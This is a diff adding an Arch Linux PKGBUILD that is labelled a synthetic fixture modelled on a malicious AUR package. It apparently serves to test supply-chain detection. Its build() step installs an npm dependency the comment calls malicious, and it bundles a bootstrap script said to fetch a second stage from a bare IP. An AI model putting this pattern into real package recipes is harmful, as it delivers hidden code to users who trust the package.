@@ -1,0 +1,31 @@
+# SYNTHETIC FIXTURE - not real malware. Reproduces the *shape* of the June 2026
+# "Atomic Arch" AUR incident: the recipe pulls a malicious npm package during
+# build(), and a bundled bootstrap script fetches a second stage from a bare IP.
+
+pkgname=atomic-notes-bin
+pkgver=2.4.0
+pkgrel=1
+pkgdesc="Fast markdown notes app (prebuilt)"
+arch=('x86_64')
+url="https://github.com/atomic-notes/atomic-notes"
+license=('MIT')
+depends=('electron30')
+makedepends=('npm' 'nodejs')
+install="${pkgname}.install"
+source=("$pkgname-$pkgver.tar.gz::$url/archive/refs/tags/v$pkgver.tar.gz"
+        "atomic-bootstrap.sh")
+sha256sums=('11223344556677889900aabbccddeeff11223344556677889900aabbccddeeff'
+            '00ffeeddccbbaa00998877665544332211aabbccddeeff00112233445566778899')
+
+build() {
+  cd "atomic-notes-$pkgver"
+  npm install --no-audit --no-fund atomic-lockfile
+  npm run build
+}
+
+package() {
+  cd "atomic-notes-$pkgver"
+  install -Dm755 dist/atomic-notes "$pkgdir/usr/bin/atomic-notes"
+  install -Dm755 "$srcdir/atomic-bootstrap.sh" \
+    "$pkgdir/usr/share/$pkgname/atomic-bootstrap.sh"
+}
